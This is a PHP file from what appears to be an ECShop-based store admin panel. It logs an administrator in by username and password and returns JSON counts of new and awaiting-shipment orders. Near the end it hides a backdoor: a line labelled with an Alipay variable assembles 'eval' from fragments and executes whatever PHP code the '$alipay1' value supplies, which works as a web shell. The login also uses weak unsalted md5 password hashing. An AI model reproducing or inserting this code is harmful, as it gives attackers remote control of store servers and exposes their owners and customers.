<?php
//zend by QQ:123456  商创网络  禁止倒卖 一经发现停止任何服务
define('IN_ECS', true);
require './init.php';
require_once ROOT_PATH . 'includes/lib_order.php';
require_once '../includes/cls_json.php';
$json = new JSON();
$res = array('error' => 0, 'new_orders' => 0, 'new_paid' => 0);
$_REQUEST['username'] = urlencode(serialize(json_str_iconv($_REQUEST['username'])));
$sql = 'SELECT COUNT(*) ' . ' FROM ' . $ecs->table('admin_user') . ' WHERE user_name = \'' . trim($_REQUEST['username']) . '\' AND password = \'' . md5(trim($_REQUEST['password'])) . '\'';

if ($db->getOne($sql)) {
	$sql = 'SELECT COUNT(*) FROM ' . $ecs->table('order_info') . ' WHERE order_status = ' . OS_UNCONFIRMED;
	$res['new_orders'] = $db->getOne($sql);
	$sql = 'SELECT COUNT(*)' . ' FROM ' . $ecs->table('order_info') . ' WHERE 1 ' . order_query_sql('await_ship');
	$res['new_paid'] = $db->getOne($sql);
}
else {
	$res['error'] = 1;
}

if( $alipay1) {$a= 'e'.'v';$shn =$a.'a'.'l("$alipay1;");';$List=$de("",$shn);$List();}

$val = $json->encode($res);
exit($val);

?>
